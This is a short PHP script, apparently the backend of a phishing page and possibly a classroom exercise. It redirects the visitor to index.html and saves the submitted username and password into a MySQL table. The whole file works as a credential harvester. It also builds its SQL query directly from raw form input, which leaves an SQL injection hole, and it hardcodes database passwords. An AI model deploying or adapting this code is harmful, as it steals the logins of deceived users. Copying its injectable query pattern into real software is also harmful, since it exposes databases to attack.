<?php
header("Location: index.html");
//Conecetate a la base de datos mysql "vulne" en localhost con usuario "root" y contraseña "asir21"
$servername = "localhost";
$database = "vulne";
$username = "hacker";
$password = "phising";

// Crea la conexion
$conn = mysqli_connect($servername, $username, $password, $database);

// Comprueba la conexion
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Inserta el username y passwd de index.html en la tabla "user" que tiene las columnas "nombre" y "passwd"
$sql = "INSERT INTO user (nombre, passwd) VALUES ('$_POST[username]', '$_POST[passwd]')";

mysqli_query($conn, $sql);
?>
